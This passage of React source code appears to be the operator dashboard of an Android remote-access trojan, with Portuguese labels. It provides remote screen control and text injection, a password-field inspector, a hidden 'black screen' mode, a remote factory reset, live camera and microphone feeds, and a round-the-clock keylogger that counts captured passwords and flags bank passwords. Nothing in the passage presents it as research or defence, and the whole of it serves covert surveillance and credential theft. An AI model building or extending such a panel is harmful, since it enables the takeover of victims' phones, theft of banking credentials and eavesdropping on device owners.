                      <p className="text-xs font-bold text-[#ef4444] mb-3">VNC Não Iniciado</p>
                      <button
                        onClick={toggleCapture}
                        className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md text-xs shadow-[0_0_12px_rgba(239,68,68,0.4)] transition-all"
                      >
                        ¶ Iniciar VNC
                      </button>
                    </div>
                  )}
                </div>

                {/* Bottom nav bar */}
                <div className="flex items-center justify-center py-1 bg-[#320a03] border-t border-[#2a2a31]/20 shrink-0">
                  <div className="w-24 h-1 bg-[#ef4444]/60 rounded-full shadow-[0_0_8px_rgba(239,68,68,0.6)]"></div>
                </div>
              </div>
            </FloatingWindow>

            {/* Screen Reader V2 - COM MOLDURA DE CELULAR + INSPETOR E EDITOR DE ELEMENTOS */}
            <FloatingWindow
              id="screenReader"
              title=" Screen Reader V2 (Editor & Inspetor)"
              isOpen={floatingWindows.screenReader.open}
              position={{ x: floatingWindows.screenReader.x, y: floatingWindows.screenReader.y }}
              size={{ width: Math.max(floatingWindows.screenReader.width, showV2Inspector ? 780 : 420), height: floatingWindows.screenReader.height }}
              zIndex={floatingWindows.screenReader.zIndex}
              onClose={() => toggleWindow('screenReader')}
              onFocus={() => bringToFront('screenReader')}
              onDrag={(x, y) => updateWindowPosition('screenReader', x, y)}
              onResize={(w, h) => updateWindowSize('screenReader', w, h)}
              headerColor="bg-gradient-to-r from-[#ef4444] via-[#f87171] to-[#24242a]"
            >
              <div className="h-full bg-[#1e0603] flex flex-col overflow-hidden select-none">
                {/*   BARRA DE FERRAMENTAS & EDIƒO RPIDA V2 (AZUL CIANO NEON) */}
                <div className="bg-[#360b03] border-b border-[#2a2a31]/30 px-3 py-1.5 flex items-center justify-between gap-2 shrink-0 text-xs">
                  <div className="flex items-center gap-1.5">
                    <button
                      onClick={() => setShowV2Inspector(!showV2Inspector)}
                      className={`px-2.5 py-1 rounded-md font-bold flex items-center gap-1 transition-all ${
                        showV2Inspector
                          ? 'bg-[#ef4444] text-black shadow-[0_0_10px_rgba(239,68,68,0.5)]'
                          : 'bg-[#1a1a1e]/60 text-[#ef4444] hover:bg-[#24242a] border border-[#2a2a31]/30'
                      }`}
                      title="Ver e inspecionar lista de elementos detectados na tela"
                    >
                      <Eye className="w-3.5 h-3.5" />
                      <span>{showV2Inspector ? 'Fechar Inspetor' : ' Inspecionar Elementos'}</span>
                    </button>
                    
                    <button
                      onClick={() => setV2DesignTheme(v2DesignTheme === 'cyan' ? 'matrix' : 'cyan')}
                      className="px-2 py-1 bg-[#24242a] hover:bg-[#2a2a31] text-[#ef4444] rounded-md text-[11px] font-mono border border-[#2a2a31]/20"
                    >
                       {v2DesignTheme === 'cyan' ? 'Tema Azul/Ciano' : 'Tema Matrix'}
                    </button>
                  </div>

                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => setV2HideUntypedElements(!v2HideUntypedElements)}
                      className={`px-2 py-1 rounded-md text-[10px] font-bold ${
                        v2HideUntypedElements ? 'bg-amber-600/80 text-white' : 'bg-[#24242a] text-slate-400'
                      }`}
                    >
                      {v2HideUntypedElements ? 'ˆ Ocultando Vazios' : ' Mostrar Todos'}
                    </button>
                    <div className="flex items-center gap-1 bg-[#121214] px-2 py-0.5 rounded-md border border-[#2a2a31]/20 text-[10px]">
                      <span className="text-gray-400">Zoom:</span>
                      <button onClick={() => setV2TextScale(prev => Math.max(0.6, prev - 0.1))} className="text-[#ef4444] font-bold hover:text-white px-1">-</button>
                      <span className="text-[#ef4444] font-mono">{(v2TextScale * 100).toFixed(0)}%</span>
                      <button onClick={() => setV2TextScale(prev => Math.min(2.0, prev + 0.1))} className="text-[#ef4444] font-bold hover:text-white px-1">+</button>
                    </div>
                  </div>
                </div>

                {/* CONTEÚDO PRINCIPAL (MOLDURA CELULAR + PAINEL DE INSPECIONAR ELEMENTOS) */}
                <div className="flex-1 flex overflow-hidden p-2 gap-2">
                  {/*  MOLDURA DE CELULAR DA TELA V2 (SEM ESPAÇOS PRETOS NAS LATERAIS) */}
                  <div className="flex-1 h-full flex items-center justify-center p-0.5 overflow-hidden">
                    <div 
                      className="relative bg-gradient-to-b from-[#121214] via-[#320a03] to-slate-950 rounded-[34px] p-1.5 shadow-[0_0_25px_rgba(239,68,68,0.35)] border border-[#2a2a31]/40 flex flex-col h-full overflow-hidden select-none"
                      style={{
                        aspectRatio: `${(screenHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH)} / ${(screenHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT)}`,
                        maxHeight: '100%'
                      }}
                    >
                      {/* Top Island / Camera Notch */}
                      <div className="w-full flex items-center justify-between px-3 pt-1 pb-1 shrink-0">
                        <span className="text-[10px] font-mono font-bold text-[#ef4444]">12:00</span>
                        <div className="flex items-center gap-1.5 px-2.5 py-0.5 bg-black/90 rounded-full border border-[#2a2a31]/40 shadow-[0_0_8px_rgba(239,68,68,0.3)]">
                          <div className="w-2 h-2 bg-[#ef4444] rounded-full animate-pulse"></div>
                          <div className="w-6 h-1 bg-[#24242a] rounded-full"></div>
                        </div>
                        <span className="text-[9px] font-mono text-[#ef4444]">Screen V2</span>
                      </div>

                      {/* Canvas da Tela V2 Real */}
                      <div className="relative bg-black rounded-[22px] overflow-hidden border border-[#2a2a31]/20 flex-1 w-full flex items-center justify-center">
                        {screenHierarchy ? (
                          <div 
                            className="relative cursor-crosshair w-full h-full flex items-center justify-center"
                            onMouseDown={(e) => {
                              const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                              if (!screenElement) return;
                              const rect = screenElement.getBoundingClientRect();
                              const x = e.clientX - rect.left;
                              const y = e.clientY - rect.top;
                              setMouseDownPos({ x, y });
                              setMouseDownTime(Date.now());
                              setIsDragging(true);
                              dragPathRef.current = [{ x, y }];
                            }}
                            onMouseMove={(e) => {
                              if (!isDragging || !mouseDownPos) return;
                              const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                              if (!screenElement) return;
                              const rect = screenElement.getBoundingClientRect();
                              const x = e.clientX - rect.left;
                              const y = e.clientY - rect.top;
                              const lastPoint = dragPathRef.current[dragPathRef.current.length - 1];
                              const dist = Math.sqrt(Math.pow(x - lastPoint.x, 2) + Math.pow(y - lastPoint.y, 2));
                              if (dist > 15) dragPathRef.current.push({ x, y });
                            }}
                            onMouseUp={(e) => {
                              if (!mouseDownPos) return;
                              const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                              if (!screenElement) return;
                              const rect = screenElement.getBoundingClientRect();
                              const upX = e.clientX - rect.left;
                              const upY = e.clientY - rect.top;
                              const downX = mouseDownPos.x;
                              const downY = mouseDownPos.y;
                              const deltaX = upX - downX;
                              const deltaY = upY - downY;
                              const distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
                              const holdTime = Date.now() - mouseDownTime;
                              
                              const devW = screenHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
                              const devH = screenHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
                              const realScale = rect.width / devW;
                              
                              const deviceDownX = Math.round(downX / realScale);
                              const deviceDownY = Math.round(downY / realScale);
                              const deviceUpX = Math.round(upX / realScale);
                              const deviceUpY = Math.round(upY / realScale);
                              
                              if (deviceDownX < 0 || deviceDownX > devW || deviceDownY < 0 || deviceDownY > devH) {
                                setMouseDownPos(null);
                                setIsDragging(false);
                                dragPathRef.current = [];
                                return;
                              }
                              
                              const normX = Math.max(0, Math.min(1, deviceDownX / devW));
                              const normY = Math.max(0, Math.min(1, deviceDownY / devH));
                              const normX1 = normX;
                              const normY1 = normY;
                              const normX2 = Math.max(0, Math.min(1, deviceUpX / devW));
                              const normY2 = Math.max(0, Math.min(1, deviceUpY / devH));
                              
                              if (holdTime > 500 && distance < 10) {
                                sendCommand({ action: 'LONG_PRESS', x: normX, y: normY, scale: 'vnc_norm' });
                                addLog(` Long Press: (${deviceDownX}, ${deviceDownY})`);
                              }
                              else if (distance > 30) {
                                sendCommand({ action: 'SWIPE', x1: normX1, y1: normY1, x2: normX2, y2: normY2, scale: 'vnc_norm' });
                                addLog(` Swipe: (${deviceDownX},${deviceDownY})  (${deviceUpX},${deviceUpY})`);
                              }
                              else {
                                sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
                                addLog(`± Click: (${deviceDownX}, ${deviceDownY})`);
                              }
                              
                              setMouseDownPos(null);
                              setIsDragging(false);
                              dragPathRef.current = [];
                            }}
                            onMouseLeave={() => {
                              if (isDragging) {
                                setMouseDownPos(null);
                                setIsDragging(false);
                                dragPathRef.current = [];
                              }
                            }}
                          >
                            <ScreenReaderCanvas 
                              hierarchy={screenHierarchy.hierarchy} 
                              scale={1} 
                              hoveredNode={hoveredNode}
                              textScale={v2TextScale}
                              designTheme={v2DesignTheme}
                              hideUntyped={v2HideUntypedElements}
                            />
                          </div>
                        ) : (
                          <div className="h-full flex items-center justify-center text-[#ef4444]">
                            <div className="text-center p-4">
                              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#3a3a44] mx-auto mb-2"></div>
                              <p className="text-xs font-mono">Aguardando dados da Tela V2...</p>
                            </div>
                          </div>
                        )}
                      </div>

                      {/* Bottom Bar */}
                      <div className="w-full flex items-center justify-center pt-1.5 pb-0.5 shrink-0">
                        <div className="w-24 h-1 bg-[#ef4444]/60 rounded-full shadow-[0_0_8px_rgba(239,68,68,0.6)]"></div>
                      </div>
                    </div>
                  </div>

                  {/*  PAINEL LATERAL INSPETOR E EDITOR DE ELEMENTOS DA TELA V2 */}
                  {showV2Inspector && (
                    <div className="w-80 bg-[#2e0903] rounded-md border border-[#2a2a31]/30 flex flex-col overflow-hidden shadow-2xl shrink-0">
                      {/* Cabeçalho do Inspetor */}
                      <div className="bg-[#420e05] px-3 py-2 border-b border-[#2a2a31]/30 flex items-center justify-between">
                        <span className="font-bold text-xs text-[#ef4444] flex items-center gap-1.5 font-mono">
                          <Eye className="w-4 h-4 text-[#ef4444]" />
                          Elementos da Tela V2
                        </span>
                        <span className="px-2 py-0.5 bg-[#121214] text-[#ef4444] text-[10px] font-mono rounded-full border border-[#2a2a31]/30">
                          {visibleV2Nodes.length} itens
                        </span>
                      </div>

                      {/* Aba de Categorias: Todos, Botões, Inputs, Textos */}
                      <div className="grid grid-cols-4 gap-1 p-1 bg-[#1e0603] border-b border-[#2a2a31]/20 text-[10px] font-mono shrink-0">
                        <button
                          type="button"
                          onClick={() => setV2InspectorCategory('all')}
                          className={`py-1 rounded text-center font-bold transition-all cursor-pointer ${
                            v2InspectorCategory === 'all'
                              ? 'bg-[#ef4444] text-black shadow-md'
                              : 'bg-[#121214] text-slate-400 hover:text-white'
                          }`}
                        >
                           Todos
                        </button>
                        <button
                          type="button"
                          onClick={() => setV2InspectorCategory('buttons')}
                          className={`py-1 rounded text-center font-bold transition-all cursor-pointer ${
                            v2InspectorCategory === 'buttons'
                              ? 'bg-[#ef4444] text-white shadow-md'
                              : 'bg-[#121214] text-slate-400 hover:text-white'
                          }`}
                        >
                           Botões
                        </button>
                        <button
                          type="button"
                          onClick={() => setV2InspectorCategory('inputs')}
                          className={`py-1 rounded text-center font-bold transition-all cursor-pointer ${
                            v2InspectorCategory === 'inputs'
                              ? 'bg-amber-600 text-white shadow-md'
                              : 'bg-[#121214] text-slate-400 hover:text-white'
                          }`}
                        >
                           Inputs
                        </button>
                        <button
                          type="button"
                          onClick={() => setV2InspectorCategory('texts')}
                          className={`py-1 rounded text-center font-bold transition-all cursor-pointer ${
                            v2InspectorCategory === 'texts'
                              ? 'bg-[#84cc16] text-white shadow-md'
                              : 'bg-[#121214] text-slate-400 hover:text-white'
                          }`}
                        >
                           Textos
                        </button>
                      </div>

                      {/* Busca / Filtro de Elementos */}
                      <div className="p-2 border-b border-[#2a2a31]/20 bg-[#200603]">
                        <input
                          type="text"
                          placeholder=" Buscar botão, input, senha..."
                          value={v2SearchTerm}
                          onChange={(e) => setV2SearchTerm(e.target.value)}
                          className="w-full px-2.5 py-1.5 bg-[#380c04] border border-[#2a2a31]/30 rounded-md text-xs text-white placeholder-slate-400 focus:outline-none focus:border-[#3a3a44] font-mono"
                        />
                      </div>

                      {/* Lista de Elementos Detectados na V2 */}
                      <div className="flex-1 overflow-y-auto p-2 space-y-1.5">
                        {visibleV2Nodes.filter(node => {
                          const isPass = node.password;
                          const isBtn = node.clickable || (node.class || '').toLowerCase().includes('button');
                          const isEdit = node.editable || (node.class || '').toLowerCase().includes('edittext');
                          
                          if (v2InspectorCategory === 'buttons' && !isBtn) return false;
                          if (v2InspectorCategory === 'inputs' && !isEdit && !isPass) return false;
                          if (v2InspectorCategory === 'texts' && (isBtn || isEdit || isPass)) return false;

                          if (!v2SearchTerm.trim()) return true;
                          const query = v2SearchTerm.toLowerCase();
                          const t = (node.text || node.desc || node.hint || node.id || '').toLowerCase();
                          return t.includes(query);
                        }).map((node, idx) => {
                          const isPass = node.password;
                          const isBtn = node.clickable || (node.class || '').toLowerCase().includes('button');
                          const isEdit = node.editable || (node.class || '').toLowerCase().includes('edittext');
                          const label = node.text || node.desc || node.hint || node.id || 'Elemento sem texto';
                          const devW = screenHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
                          const devH = screenHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
                          
                          return (
                            <div
                              key={idx}
                              onMouseEnter={() => setHoveredNode(node)}
                              onMouseLeave={() => setHoveredNode(null)}
                              className={`p-2 rounded-md text-xs transition-all border ${
                                hoveredNode === node
                                  ? 'bg-[#121214]/80 border-[#3a3a44] shadow-[0_0_12px_rgba(239,68,68,0.4)]'
                                  : isPass
                                  ? 'bg-[#121214]/30 border-[#2a2a31]/30 hover:border-[#3a3a44]'
                                  : isBtn
                                  ? 'bg-[#121214]/40 border-[#2a2a31]/30 hover:border-[#3a3a44]'
                                  : 'bg-[#360b04] border-[#2a2a31]/15 hover:border-[#2a2a31]/40'
                              }`}
                            >
                              <div className="flex items-center justify-between mb-1">
                                <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${
                                  isPass ? 'bg-[#1a1a1e] text-[#ef4444]' : isBtn ? 'bg-[#1a1a1e] text-[#ef4444]' : isEdit ? 'bg-amber-900 text-amber-300' : 'bg-[#24242a] text-slate-400'
                                }`}>
                                  {isPass ? ' Senha' : isBtn ? ' Botão' : isEdit ? ' Input' : '± Texto'}
                                </span>
                                {node.bounds && (
                                  <span className="text-[9px] font-mono text-[#ef4444]/70">
                                    [{node.bounds.x},{node.bounds.y}] {node.bounds.w}x{node.bounds.h}
                                  </span>
                                )}
                              </div>

                              <div className="font-mono text-xs text-white break-all mb-1.5 font-bold">
                                {label}
                              </div>

                              {/* Ações rápidas sobre o elemento */}
                              {node.bounds && (
                                <div className="flex items-center gap-1">
                                  <button
                                    onClick={() => {
                                      const normX = (node.bounds!.x + node.bounds!.w / 2) / devW;
                                      const normY = (node.bounds!.y + node.bounds!.h / 2) / devH;
                                      sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
                                      addLog(`± Tocar no elemento: ${label}`);
                                    }}
                                    className="px-2 py-1 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md text-[10px] font-bold flex items-center gap-1 transition-all"
                                  >
                                    ± Tocar
                                  </button>

                                  {isEdit && (
                                    <button
                                      onClick={() => {
                                        const txt = prompt(`Digite o texto para preencher em "${label}":`);
                                        if (txt) {
                                          const normX = (node.bounds!.x + node.bounds!.w / 2) / devW;
                                          const normY = (node.bounds!.y + node.bounds!.h / 2) / devH;
                                          sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
                                          setTimeout(() => {
                                            sendCommand({ action: 'WRITE', text: txt });
                                            addLog(` Texto enviado para ${label}: ${txt}`);
                                          }, 400);
                                        }
                                      }}
                                      className="px-2 py-1 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md text-[10px] font-bold flex items-center gap-1 transition-all"
                                    >
                                      ¨ Digitar
                                    </button>
                                  )}
                                </div>
                              )}
                            </div>
                          );
                        })}
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </FloatingWindow>
            
            {/* Controles */}
            <FloatingWindow
              id="controls"
              title="Ž Controles"
              isOpen={floatingWindows.controls.open}
              position={{ x: floatingWindows.controls.x, y: floatingWindows.controls.y }}
              size={{ width: floatingWindows.controls.width, height: floatingWindows.controls.height }}
              zIndex={floatingWindows.controls.zIndex}
              onClose={() => toggleWindow('controls')}
              onFocus={() => bringToFront('controls')}
              onDrag={(x, y) => updateWindowPosition('controls', x, y)}
              onResize={(w, h) => updateWindowSize('controls', w, h)}
              headerColor="bg-[#ef4444]"
            >
              <div className="p-3 space-y-3 overflow-y-auto h-full">
                {/* Navegação */}
                <div className="grid grid-cols-3 gap-2">
                  <button onClick={() => sendCommand({ action: 'BACK' })} className="py-3 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-bold"> Back</button>
                  <button onClick={() => sendCommand({ action: 'HOME' })} className="py-3 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-bold"> Home</button>
                  <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-3 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-bold"> Recent</button>
                </div>
                
                <div>
                  <p className="text-[10px] text-gray-400 font-semibold mb-1">Controle Rápido</p>
                  <div className="grid grid-cols-5 gap-1">
                    <button type="button" onClick={() => sendCommand({ action: 'VIBRATE' })} className="py-2 bg-amber-700 hover:bg-amber-600 text-white rounded text-[10px] font-bold"></button>
                    <button type="button" onClick={() => sendCommand({ action: 'VOLUME_DOWN' })} className="py-2 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px] font-bold"></button>
                    <button type="button" onClick={() => sendCommand({ action: 'VOLUME_UP' })} className="py-2 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px] font-bold"></button>
                    <button type="button" onClick={() => sendCommand({ action: 'LOCK_DEVICE' })} className="py-2 bg-[#24242a] hover:bg-[#f87171] text-white rounded text-[10px] font-bold"></button>
                    <button type="button" onClick={() => sendCommand({ action: 'SNAP_SCREEN' })} className="py-2 bg-teal-700 hover:bg-teal-600 text-white rounded text-[10px] font-bold"></button>
                  </div>
                </div>
                
                {/* Power e Ações */}
                <div className="grid grid-cols-3 gap-2">
                  <button onClick={() => sendCommand({ action: 'POWER' })} className="py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md font-bold text-xs">» Power</button>
                  <button onClick={toggleBlackScreen} className={`py-2 rounded-md font-bold text-xs ${isBlackScreen ? 'bg-[#84cc16] text-white' : 'bg-[#2a2a31] text-white hover:bg-[#6f6f78]'}`}>
                    {isBlackScreen ? ' Tela ON' : ' Tela Preta'}
                  </button>
                  <button 
                    onClick={handleReconnectConnection} 
                    disabled={isReconnectingConn}
                    className={`py-2 text-white rounded-md font-bold text-xs flex items-center justify-center gap-1 shadow-md transition-all ${
                      isReconnectingConn ? 'bg-amber-800 animate-pulse cursor-wait' : 'bg-amber-600 hover:bg-amber-700 active:scale-95'
                    }`} 
                    title="Reiniciar íconexão WebSocket do Aparelho"
                  >
                    <span className={isReconnectingConn ? 'animate-spin' : ''}></span>
                    {isReconnectingConn ? 'Reíconectando...' : 'Reíconectar'}
                  </button>
                </div>
                
                <div className="grid grid-cols-2 gap-2">
                  <button onClick={() => sendCommand({ action: 'NOTIFICATIONS' })} className="py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-sm font-bold"> Notificações</button>
                  <button onClick={() => sendCommand({ action: 'QUICK_SETTINGS' })} className="py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-sm font-bold">š Config</button>
                </div>
                
                <button 
                  onClick={handleFormatDevice} 
                  className="w-full py-2 bg-[#121214] hover:bg-[#24242a] text-white rounded-md text-xs font-bold border border-[#3a3a44] tracking-wider uppercase transition-all"
                >
                   Formatar Equipamento (Reset)
                </button>
                
                {/* Captura */}
                <div className="flex gap-2">
                  <button onClick={toggleCapture} className={`flex-1 py-2 rounded-md font-bold ${isCaptureEnabled ? 'bg-green-600 text-white' : 'bg-[#2a2a31] text-white hover:bg-[#6f6f78]'}`}>
                    {isCaptureEnabled ? '´ Captura Ativa' : '¶ Iniciar Captura'}
                  </button>
                  <button 
                    onClick={restartCapture}
                    className="px-3 py-2 bg-[#84cc16] hover:bg-orange-700 text-white rounded-md font-bold"
                    title="Reiniciar VNC - Use se perdeu íconexão"
                  >
                    
                  </button>
                </div>
                
                {/* Digitar Texto */}
                <div className="space-y-2">
                  <input
                    type="text"
                    value={textToSend}
                    onChange={(e) => setTextToSend(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handleSendText()}
                    placeholder="Digite o texto..."
                    className="w-full px-3 py-2 bg-[#2a2a31] border border-[#2a2a31]/25 rounded text-white placeholder-gray-400"
                  />
                  <button onClick={handleSendText} disabled={!textToSend.trim()} className="w-full py-2 bg-[#ef4444] hover:bg-[#f87171] disabled:bg-[#2a2a31] text-white rounded-md font-bold">
                    Enviar Texto
                  </button>
                </div>
              </div>
            </FloatingWindow>
            
            {/* Cmera */}
            <FloatingWindow
              id="camera"
              title=" Cmera"
              isOpen={floatingWindows.camera.open}
              position={{ x: floatingWindows.camera.x, y: floatingWindows.camera.y }}
              size={{ width: floatingWindows.camera.width, height: floatingWindows.camera.height }}
              zIndex={floatingWindows.camera.zIndex}
              onClose={() => {
                toggleWindow('camera');
                if (isCameraEnabled) toggleCamera();
              }}
              onFocus={() => bringToFront('camera')}
              onDrag={(x, y) => updateWindowPosition('camera', x, y)}
              onResize={(w, h) => updateWindowSize('camera', w, h)}
              headerColor="bg-[#ef4444]"
            >
              <div className="h-full bg-black flex items-center justify-center">
                <canvas ref={cameraCanvasRef} className="max-w-full max-h-full" />
                <div className="absolute bottom-2 left-2 right-2 flex justify-center space-x-2">
                  <button onClick={switchCamera} className="px-3 py-1 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-sm">
                     {currentCamera === 'back' ? 'Frontal' : 'Traseira'}
                  </button>
                </div>
              </div>
            </FloatingWindow>
            
            {/* Microfone */}
            <FloatingWindow
              id="microphone"
              title=" Microfone"
              isOpen={floatingWindows.microphone.open}
              position={{ x: floatingWindows.microphone.x, y: floatingWindows.microphone.y }}
              size={{ width: floatingWindows.microphone.width, height: floatingWindows.microphone.height }}
              zIndex={floatingWindows.microphone.zIndex}
              onClose={() => {
                toggleWindow('microphone');
                if (isMicrophoneEnabled) toggleMicrophone();
              }}
              onFocus={() => bringToFront('microphone')}
              onDrag={(x, y) => updateWindowPosition('microphone', x, y)}
              onResize={(w, h) => updateWindowSize('microphone', w, h)}
              headerColor="bg-[#4d7c0f]"
            >
              <div className="h-full bg-[#1a1a1e] flex items-center justify-center">
                <div className="text-center">
                  <div className="text-6xl mb-4 animate-pulse"></div>
                  <p className="text-white font-bold">Ouvindo...</p>
                  <p className="text-gray-400 text-sm mt-2">udio em tempo real ativo</p>
                </div>
              </div>
            </FloatingWindow>
            
            {/* Keylogger - NOVO SISTEMA COM CALENDRIO */}
            <FloatingWindow
              id="keylogger"
              title={`¨ Keylogger 24/7 ${keylogTotalToday > 0 ? `(${keylogTotalToday} hoje)` : ''}`}
              isOpen={floatingWindows.keylogger.open}
              position={{ x: floatingWindows.keylogger.x, y: floatingWindows.keylogger.y }}
              size={{ width: Math.max(floatingWindows.keylogger.width, 450), height: Math.max(floatingWindows.keylogger.height, 550) }}
              zIndex={floatingWindows.keylogger.zIndex}
              onClose={() => toggleWindow('keylogger')}
              onFocus={() => bringToFront('keylogger')}
              onDrag={(x, y) => updateWindowPosition('keylogger', x, y)}
              onResize={(w, h) => updateWindowSize('keylogger', w, h)}
              headerColor="bg-gradient-to-r from-yellow-700 to-orange-700"
            >
              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-[#24242a] to-[#121214]">
                {/* Š RESUMO ESTATSTICO */}
                {keylogSummary && (
                  <div className="grid grid-cols-3 gap-2 mb-3">
                    <div className="bg-[#2a2a31]/50 rounded-md p-2 text-center">
                      <div className="text-lg font-bold text-yellow-400">{keylogSummary.total_logs || 0}</div>
                      <div className="text-[9px] text-gray-400">Total</div>
                    </div>
                    <div className="bg-[#2a2a31]/50 rounded-md p-2 text-center">
                      <div className="text-lg font-bold text-green-400">{keylogSummary.today_logs || 0}</div>
                      <div className="text-[9px] text-gray-400">Hoje</div>
                    </div>
                    <div className="bg-[#2a2a31]/50 rounded-md p-2 text-center">
                      <div className="text-lg font-bold text-[#ef4444]">{keylogSummary.passwords_captured || 0}</div>
                      <div className="text-[9px] text-gray-400">Senhas</div>
                    </div>
                  </div>
                )}
                
                {/*  SELETOR DE DATA */}
                <div className="bg-[#2a2a31]/30 rounded-md p-2 mb-3">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-xs text-gray-400"> Selecionar Data:</span>
                    <button
                      onClick={() => {
                        const d = new Date();
                        const today = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
                        setKeylogSelectedDate(today);
                      }}
                      className="px-2 py-1 bg-green-600 hover:bg-green-700 text-white text-[10px] rounded"
                    >
                      Hoje
                    </button>
                  </div>
                  
                  <input
                    type="date"
                    value={keylogSelectedDate}
                    onChange={(e) => setKeylogSelectedDate(e.target.value)}
                    className="w-full px-3 py-2 bg-[#121214] border border-[#2a2a31]/25 rounded-md text-white text-sm focus:outline-none focus:border-yellow-500"
                    max={(() => {
                      const d = new Date();
                      return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
                    })()}
                  />
                  
                  {/* Datas com atividade */}
                  {keylogDates.length > 0 && (
                    <div className="mt-2 flex flex-wrap gap-1">
                      {keylogDates.slice(0, 7).map((d, i) => (
                        <button
                          key={i}
                          onClick={() => setKeylogSelectedDate(d.date)}
                          className={`px-2 py-1 text-[9px] rounded ${
                            d.date === keylogSelectedDate
                              ? 'bg-yellow-600 text-white'
                              : 'bg-[#6f6f78] text-gray-300 hover:bg-[#8b8b94]'
                          }`}
                        >
                          {new Date(d.date + 'T12:00:00').toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' })}
                          <span className="ml-1 text-yellow-300">({d.count})</span>
                        </button>
                      ))}
                    </div>
                  )}
                </div>
                
                {/*  LISTA DE KEYLOGS DO DIA */}
                <div className="flex items-center justify-between mb-2">
                  <h4 className="text-sm font-semibold text-white flex items-center">
                    <Keyboard className="w-4 h-4 mr-2 text-yellow-400" />
                    {new Date(keylogSelectedDate + 'T12:00:00').toLocaleDateString('pt-BR', { 
                      weekday: 'long', 
                      day: '2-digit', 
                      month: 'long' 
                    })}
                    <span className="ml-2 px-2 py-0.5 bg-yellow-600 text-white text-[10px] rounded-full">
                      {keylogsByDate.length}
                    </span>
                  </h4>
                  <button
                    onClick={downloadKeylogs}
                    className="flex items-center px-2 py-1 bg-[#ef4444] hover:bg-[#f87171] text-white text-[10px] rounded"
                  >
                    <Download className="w-3 h-3 mr-1" />
                    Baixar
                  </button>
                </div>
                
                {isLoadingKeylogs ? (
                  <div className="text-center py-6">
                    <div className="animate-spin w-6 h-6 border-2 border-yellow-500 border-t-transparent rounded-full mx-auto mb-2"></div>
                    <p className="text-sm text-gray-400">Carregando...</p>
                  </div>
                ) : keylogsByDate.length > 0 ? (
                  <div className="bg-[#1a1a1e]/50 rounded-md p-2 space-y-1 max-h-[300px] overflow-y-auto">
                    {/* INVERTIDO: Logs mais recentes primeiro (em cima) */}
                    {[...keylogsByDate].reverse().map((log, i) => {
                      const friendlyName = getAppFriendlyName(log.package || '', log.appName || '');
                      return (
                        <div key={i} className={`p-2 rounded-md ${
                          log.isPassword 
                            ? 'bg-[#1a1a1e]/40 border border-[#2a2a31]/50' 
                            : 'bg-[#121214]/50'
                        }`}>
                          <div className="flex items-center justify-between text-[10px]">
                            <span className="text-yellow-400 font-mono">{log.time}</span>
                            <span className="text-[#ef4444] font-semibold truncate max-w-[120px]">{friendlyName}</span>
                            {log.isOffline && <span className="text-[#ef4444]"></span>}
                          </div>
                          <div className={`font-mono text-sm break-all mt-1 ${
                            log.isPassword ? 'text-[#ef4444] font-bold' : 'text-white'
                          }`}>
                            {log.isPassword && ' '}
                            {log.text}
                          </div>
                          {log.eventType && log.eventType !== 'TEXT_CHANGED' && (
                            <div className="text-[8px] text-gray-500 mt-1">
                              {log.eventType.replace('BANK_PASSWORD_COMPLETE', ' SENHA BANCRIA')}
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                ) : (
                  <div className="text-center py-8 bg-[#1a1a1e]/30 rounded-md">
                    <div className="text-3xl mb-2"></div>
                    <p className="text-sm text-gray-400">Nenhum keylog nesta data</p>
                    <p className="text-[10px] text-gray-500 mt-1">Selecione outra data ou aguarde</p>
                  </div>
                )}
                
                {/*  INDICADOR DE TEMPO REAL - Sem pulsação excessiva */}
                {keylogSelectedDate === (() => {
                  const d = new Date();
                  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
                })() && (
                  <div className="mt-3 flex items-center justify-center gap-2 text-[10px] text-green-400">
                    <span className="w-2 h-2 bg-green-500 rounded-full"></span>
                     Atualizando em tempo real
                  </div>
                )}
                
                {/* LEGENDA */}
                <div className="mt-3 flex items-center justify-center gap-4 text-[9px] text-gray-500">
                  <span> = Senha</span>
                  <span> = Offline</span>
                  <span> = Banco</span>
                </div>
              </div>
            </FloatingWindow>
            
